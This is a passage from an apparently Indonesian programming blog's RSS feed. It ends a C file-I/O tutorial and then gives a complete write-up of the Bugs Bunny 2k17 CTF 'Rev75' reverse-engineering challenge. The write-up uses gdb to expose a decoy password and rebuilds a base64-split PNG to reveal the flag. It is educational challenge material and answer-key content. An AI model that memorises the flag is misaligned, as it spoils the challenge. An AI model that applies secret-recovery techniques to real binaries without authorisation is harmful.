&lt;p&gt;&lt;strong&gt;Contoh penggunanaan&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Belajar_io.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;Return Value&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;font color=&quot;green&quot;&gt;Success&lt;/font&gt;
    &lt;p&gt;Return 0&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;font color=&quot;red&quot;&gt;Fail&lt;/font&gt;
    &lt;p&gt;Return EOF&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;membaca-sebuah-file&quot;&gt;Membaca Sebuah File&lt;/h3&gt;

&lt;p&gt;Terdapat banyak fungsi yang dapat digunakan untuk membaca sebuah file di C, diantara nya akan dibahasa adalah fgetc(), fgets(), fread()&lt;/p&gt;

&lt;h1 id=&quot;to-be-continue&quot;&gt;To be continue&lt;/h1&gt;
</description>
        <pubDate>Sun, 25 Jun 2017 00:00:00 +0700</pubDate>
        <link>https://rhama.my.id/programming/2017/06/25/c-file-input-output.html</link>
        <guid isPermaLink="true">https://rhama.my.id/programming/2017/06/25/c-file-input-output.html</guid>
        
        <category>C</category>
        
        <category>Programming</category>
        
        
        <category>Programming</category>
        
      </item>
    
      <item>
        <title>Bugs Bunny 2k17 CTF - Rev75</title>
        <description>&lt;h2 id=&quot;deskripsi-soal&quot;&gt;Deskripsi Soal&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;i ran the binary but no password match but believe this is another simple reverse engineering challenge . &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Diberikan file elf binary static bernama rev75 64 bit yang harus direversing agar bisa mendapatkan flag.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;➜  rev75 file rev75
rev75: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.24, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1bd9592380c83821bf975f46076118ecfd1964df, not stripped&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Binary tersebut membutuhkan password sebagai argumentnya&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;➜  rev75 ./rev75 
usage: ./rev75 password
➜  rev75 ./rev75 test123
bad password&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;proof-of-concept&quot;&gt;Proof Of Concept&lt;/h2&gt;

&lt;p&gt;Disassembly fungsi main&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;pdisass main
Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
   0x000000000040a08c &amp;lt;+0&amp;gt;:	push   rbp
   0x000000000040a08d &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x000000000040a090 &amp;lt;+4&amp;gt;:	push   rbx
   0x000000000040a091 &amp;lt;+5&amp;gt;:	sub    rsp,0x148
   0x000000000040a098 &amp;lt;+12&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x134],edi
   0x000000000040a09e &amp;lt;+18&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x140],rsi
   0x000000000040a0a5 &amp;lt;+25&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x148],rdx
   0x000000000040a0ac &amp;lt;+32&amp;gt;:	mov    rax,QWORD PTR fs:0x28
   0x000000000040a0b5 &amp;lt;+41&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x18],rax
   0x000000000040a0b9 &amp;lt;+45&amp;gt;:	xor    eax,eax
   0x000000000040a0bb &amp;lt;+47&amp;gt;:	movabs rax,0x6472307773733470
   0x000000000040a0c5 &amp;lt;+57&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x130],rax
   0x000000000040a0cc &amp;lt;+64&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x128],0x0
   0x000000000040a0d6 &amp;lt;+74&amp;gt;:	mov    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x124],0x0
   0x000000000040a0df &amp;lt;+83&amp;gt;:	mov    BYTE PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x122],0x0
   0x000000000040a0e6 &amp;lt;+90&amp;gt;:	movabs rax,0x74756220646f6f67
   0x000000000040a0f0 &amp;lt;+100&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xa0],rax
   0x000000000040a0f7 &amp;lt;+107&amp;gt;:	movabs rax,0x67616c66206f6e20
   0x000000000040a101 &amp;lt;+117&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x98],rax
   0x000000000040a108 &amp;lt;+124&amp;gt;:	movabs rax,0x756f7920726f6620
   0x000000000040a112 &amp;lt;+134&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x90],rax
   0x000000000040a119 &amp;lt;+141&amp;gt;:	movabs rax,0x2069686968696820
   0x000000000040a123 &amp;lt;+151&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x88],rax
   0x000000000040a12a &amp;lt;+158&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x80],0x4478
   0x000000000040a132 &amp;lt;+166&amp;gt;:	movabs rax,0x7373617020646162
   0x000000000040a13c &amp;lt;+176&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x100],rax
   0x000000000040a143 &amp;lt;+183&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xf8],0x64726f77
   0x000000000040a14e &amp;lt;+194&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xf0],0x0
   0x000000000040a159 &amp;lt;+205&amp;gt;:	mov    BYTE PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xe8],0x0
   0x000000000040a160 &amp;lt;+212&amp;gt;:	movabs rax,0x2e203a6567617375
   0x000000000040a16a &amp;lt;+222&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xe0],rax
   0x000000000040a171 &amp;lt;+229&amp;gt;:	movabs rax,0x702035377665722f
   0x000000000040a17b &amp;lt;+239&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xd8],rax
   0x000000000040a182 &amp;lt;+246&amp;gt;:	movabs rax,0x64726f77737361
   0x000000000040a18c &amp;lt;+256&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xd0],rax
   0x000000000040a193 &amp;lt;+263&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc8],0x0
   0x000000000040a19d &amp;lt;+273&amp;gt;:	mov    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc4],0x0
   0x000000000040a1a6 &amp;lt;+282&amp;gt;:	lea    rcx,[rbp-0xa0]
   0x000000000040a1ad &amp;lt;+289&amp;gt;:	lea    rax,[rbp-0x40]
   0x000000000040a1b1 &amp;lt;+293&amp;gt;:	mov    edx,0x23
   0x000000000040a1b6 &amp;lt;+298&amp;gt;:	mov    rsi,rcx
   0x000000000040a1b9 &amp;lt;+301&amp;gt;:	mov    rdi,rax
   0x000000000040a1bc &amp;lt;+304&amp;gt;:	call   0x42b470 &amp;lt;memcpy&amp;gt;
   0x000000000040a1c1 &amp;lt;+309&amp;gt;:	lea    rcx,[rbp-0x100]
   0x000000000040a1c8 &amp;lt;+316&amp;gt;:	lea    rax,[rbp-0x70]
   0x000000000040a1cc &amp;lt;+320&amp;gt;:	mov    edx,0xd
   0x000000000040a1d1 &amp;lt;+325&amp;gt;:	mov    rsi,rcx
   0x000000000040a1d4 &amp;lt;+328&amp;gt;:	mov    rdi,rax
   0x000000000040a1d7 &amp;lt;+331&amp;gt;:	call   0x42b470 &amp;lt;memcpy&amp;gt;
   0x000000000040a1dc &amp;lt;+336&amp;gt;:	lea    rcx,[rbp-0x130]
   0x000000000040a1e3 &amp;lt;+343&amp;gt;:	lea    rax,[rbp-0x120]
   0x000000000040a1ea &amp;lt;+350&amp;gt;:	mov    edx,0x9
   0x000000000040a1ef &amp;lt;+355&amp;gt;:	mov    rsi,rcx
   0x000000000040a1f2 &amp;lt;+358&amp;gt;:	mov    rdi,rax
   0x000000000040a1f5 &amp;lt;+361&amp;gt;:	call   0x42b470 &amp;lt;memcpy&amp;gt;
   0x000000000040a1fa &amp;lt;+366&amp;gt;:	lea    rcx,[rbp-0xe0]
   0x000000000040a201 &amp;lt;+373&amp;gt;:	lea    rax,[rbp-0xc0]
   0x000000000040a208 &amp;lt;+380&amp;gt;:	mov    edx,0x18
   0x000000000040a20d &amp;lt;+385&amp;gt;:	mov    rsi,rcx
   0x000000000040a210 &amp;lt;+388&amp;gt;:	mov    rdi,rax
   0x000000000040a213 &amp;lt;+391&amp;gt;:	call   0x42b470 &amp;lt;memcpy&amp;gt;
   0x000000000040a218 &amp;lt;+396&amp;gt;:	cmp    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x134],0x1
   0x000000000040a21f &amp;lt;+403&amp;gt;:	jle    0x40a261 &amp;lt;main+469&amp;gt;
   0x000000000040a221 &amp;lt;+405&amp;gt;:	mov    rax,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x140]
   0x000000000040a228 &amp;lt;+412&amp;gt;:	add    rax,0x8
   0x000000000040a22c &amp;lt;+416&amp;gt;:	mov    rdx,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax]
   0x000000000040a22f &amp;lt;+419&amp;gt;:	lea    rax,[rbp-0x120]
   0x000000000040a236 &amp;lt;+426&amp;gt;:	mov    rsi,rdx
   0x000000000040a239 &amp;lt;+429&amp;gt;:	mov    rdi,rax
   0x000000000040a23c &amp;lt;+432&amp;gt;:	call   0x400330
   0x000000000040a241 &amp;lt;+437&amp;gt;:	&lt;span class=&quot;nb&quot;&gt;test   &lt;/span&gt;eax,eax
   0x000000000040a243 &amp;lt;+439&amp;gt;:	jne    0x40a253 &amp;lt;main+455&amp;gt;
   0x000000000040a245 &amp;lt;+441&amp;gt;:	lea    rax,[rbp-0x40]
   0x000000000040a249 &amp;lt;+445&amp;gt;:	mov    rdi,rax
   0x000000000040a24c &amp;lt;+448&amp;gt;:	call   0x411900 &amp;lt;puts&amp;gt;
   0x000000000040a251 &amp;lt;+453&amp;gt;:	jmp    0x40a270 &amp;lt;main+484&amp;gt;
   0x000000000040a253 &amp;lt;+455&amp;gt;:	lea    rax,[rbp-0x70]
   0x000000000040a257 &amp;lt;+459&amp;gt;:	mov    rdi,rax
   0x000000000040a25a &amp;lt;+462&amp;gt;:	call   0x411900 &amp;lt;puts&amp;gt;
   0x000000000040a25f &amp;lt;+467&amp;gt;:	jmp    0x40a270 &amp;lt;main+484&amp;gt;
   0x000000000040a261 &amp;lt;+469&amp;gt;:	lea    rax,[rbp-0xc0]
   0x000000000040a268 &amp;lt;+476&amp;gt;:	mov    rdi,rax
   0x000000000040a26b &amp;lt;+479&amp;gt;:	call   0x411900 &amp;lt;puts&amp;gt;
   0x000000000040a270 &amp;lt;+484&amp;gt;:	mov    eax,0x0
   0x000000000040a275 &amp;lt;+489&amp;gt;:	mov    rbx,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x18]
   0x000000000040a279 &amp;lt;+493&amp;gt;:	xor    rbx,QWORD PTR fs:0x28
   0x000000000040a282 &amp;lt;+502&amp;gt;:	je     0x40a289 &amp;lt;main+509&amp;gt;
   0x000000000040a284 &amp;lt;+504&amp;gt;:	call   0x4408f0 &amp;lt;__stack_chk_fail&amp;gt;
   0x000000000040a289 &amp;lt;+509&amp;gt;:	add    rsp,0x148
   0x000000000040a290 &amp;lt;+516&amp;gt;:	pop    rbx
   0x000000000040a291 &amp;lt;+517&amp;gt;:	pop    rbp
   0x000000000040a292 &amp;lt;+518&amp;gt;:	ret    
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Yang menarik perhatian saya adalah pemanggilan fungsi pada alamat &lt;code class=&quot;highlighter-rouge&quot;&gt;0x400330&lt;/code&gt; yang nama nya tidak ketahui (karena binary static).
Menurut asumsi saya, fungsi tersebut adalah fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;   0x000000000040a236 &amp;lt;+426&amp;gt;:	mov    rsi,rdx
   0x000000000040a239 &amp;lt;+429&amp;gt;:	mov    rdi,rax
   0x000000000040a23c &amp;lt;+432&amp;gt;:	call   0x400330
   0x000000000040a241 &amp;lt;+437&amp;gt;:	&lt;span class=&quot;nb&quot;&gt;test   &lt;/span&gt;eax,eax&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Saya memasang breakpoint pada &lt;code class=&quot;highlighter-rouge&quot;&gt;0x000000000040a23c&lt;/code&gt; agar bisa melihat isi dari argument nya.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;b &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x000000000040a23c
Breakpoint 1 at 0x40a23c&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Ternyata memang benar itu adalah fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; yang akan membandingkan inputan kita yang berada pada &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; dan string password pada &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/s &lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;
0x7fffffffdd40:	&lt;span class=&quot;s2&quot;&gt;&quot;p4ssw0rd&quot;&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/s &lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt;
0x7fffffffe2f3:	&lt;span class=&quot;s2&quot;&gt;&quot;test123&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Karena passwordnya sudah diketahui, saya mencoba menjalankan lagi binary tersebut.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;➜  rev75 ./rev75 p4ssw0rd
good but no flag &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;you hihihi xD&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ternyata hanya troll.&lt;/p&gt;

&lt;p&gt;Saya mencoba cara lain dengan melakukan checking terhadap fungsi2 yang ada di binary tersebut menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;nm&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ditemukan banyak sekali fungsi dengan nama &lt;code class=&quot;highlighter-rouge&quot;&gt;a0&lt;/code&gt; sampai &lt;code class=&quot;highlighter-rouge&quot;&gt;a814&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;...
00000000004002b0 T _init
0000000000400f4e T _start
000000000040105e T a0
000000000040108b T a1
00000000004010b8 T a2
00000000004010e5 T a3
0000000000401112 T a4
000000000040113f T a5
000000000040116c T a6
...
000000000040a005 T a812
000000000040a032 T a813
000000000040a05f T a814
000000000040a08c T main
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hasil disassembly fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;a0&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;pdisass 0x000000000040105e
Dump of assembler code from 0x40105e to 0x40107e::	Dump of assembler code from 0x40105e to 0x40107e:
   0x000000000040105e &amp;lt;a0+0&amp;gt;:	push   rbp
   0x000000000040105f &amp;lt;a0+1&amp;gt;:	mov    rbp,rsp
   0x0000000000401062 &amp;lt;a0+4&amp;gt;:	sub    rsp,0x10
   0x0000000000401066 &amp;lt;a0+8&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],rdi
   0x000000000040106a &amp;lt;a0+12&amp;gt;:	mov    rax,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8]
   0x000000000040106e &amp;lt;a0+16&amp;gt;:	mov    esi,0x49cd48
   0x0000000000401073 &amp;lt;a0+21&amp;gt;:	mov    rdi,rax
   0x0000000000401076 &amp;lt;a0+24&amp;gt;:	call   0x400330
   0x000000000040107b &amp;lt;a0+29&amp;gt;:	&lt;span class=&quot;nb&quot;&gt;test   &lt;/span&gt;eax,eax
   0x000000000040107d &amp;lt;a0+31&amp;gt;:	jne    0x401089 &amp;lt;a0+43&amp;gt;
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Fungsi tersebut akan membandingkan ‘sesuatu’ yang berada di &lt;code class=&quot;highlighter-rouge&quot;&gt;0x49cd48&lt;/code&gt; dengan &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/s 0x49cd48
0x49cd48:	&lt;span class=&quot;s2&quot;&gt;&quot;iVBORw0KGgoA&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Sesuatu tersebut ternyata adalah string base64, apabila &lt;code class=&quot;highlighter-rouge&quot;&gt;iVBORw0KGgoA&lt;/code&gt; di decode akan menghasilkan &lt;strong&gt;file signature png&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;In &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1]: &lt;span class=&quot;s2&quot;&gt;&quot;iVBORw0KGgoA&quot;&lt;/span&gt;.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;base64&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Out[1]: &lt;span class=&quot;s1&quot;&gt;'\x89PNG\r\n\x1a\n\x00'&lt;/span&gt;
In &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2]: &lt;span class=&quot;s2&quot;&gt;&quot;iVBORw0KGgoA&quot;&lt;/span&gt;.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;base64&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.encode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hex&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Out[2]: &lt;span class=&quot;s1&quot;&gt;'89504e470d0a1a0a00'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Saya rasa fungsi-fungsi a1 dan seterus nya mengandung data2 gambar PNG.
Menggunakan command &lt;code class=&quot;highlighter-rouge&quot;&gt;string&lt;/code&gt; didapatkan semua string base64 yang displit.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;...
iVBORw0KGgoA
AAANSUhEUgAA
AoAAAAGQCAYA
AAA+89ElAAAA
BmJLR0QA/wD/
AP+gvaeTAAAA
CXBIWXMAAAsT
AAALEwEAmpwY
AAAAB3RJTUUH
4QcPFScXuHT4
+AAAABl0RVh0
Q29tbWVudABD
cmVhdGVkIHdp
dGggR0lNUFeB
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Saya hanya mengambil bagian base64 untuk didecode&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat rev75_strings | tr -d &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | base64 -d &amp;gt; flag.png&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Saat dibuka ternyata error, tapi dengan menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;GIMP&lt;/code&gt; kita bisa melihat tulisan pada gambar flag.png&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/bugs-bunny2k17/FLAG_REV75.png&quot; alt=&quot;web-content&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Flag : &lt;strong&gt;Bugs_Bunny{Th1s_t0t4lly_Th3_fl4g}&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 22 Jun 2017 00:00:00 +0700</pubDate>
        <link>https://rhama.my.id/ctf/2017/06/22/bugs-bunny2k17-rev75.html</link>
        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/06/22/bugs-bunny2k17-rev75.html</guid>
        
        <category>bugs-bunny2k17</category>
        
        <category>CTF</category>
        
        
        <category>CTF</category>
        
      </item>
    
  </channel>
</rss>
